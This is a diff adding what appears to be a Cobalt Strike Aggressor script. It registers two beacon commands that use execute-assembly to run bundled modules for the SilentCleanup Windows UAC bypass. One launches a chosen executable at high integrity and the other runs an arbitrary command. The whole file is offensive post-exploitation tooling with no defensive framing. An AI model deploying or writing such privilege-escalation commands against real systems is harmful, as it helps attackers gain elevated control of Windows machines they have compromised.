@@ -1,0 +1,18 @@
+alias("uac-silentcleanup-exe", {
+	#btask($1, "foo!");
+	bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passexe.exe"), $2);
+});
+
+beacon_command_register(
+	"uac-silentcleanup-exe",
+	"Run the silentcleanup UAC bypass",
+	"Example: uac-silentcleanup [full path to executable to run in high-integrity]");
+
+alias("uac-silentcleanup-command", {
+        bexecute_assembly($1, script_resource("modules/uac_bypass_silentcleanup_passcommand.exe"), $2);
+});
+
+beacon_command_register(
+        "uac-silentcleanup-command",
+        "Run the silentcleanup UAC bypass with an abritrary command string",
+        "Example: uac-silentcleanup-command [command string]");
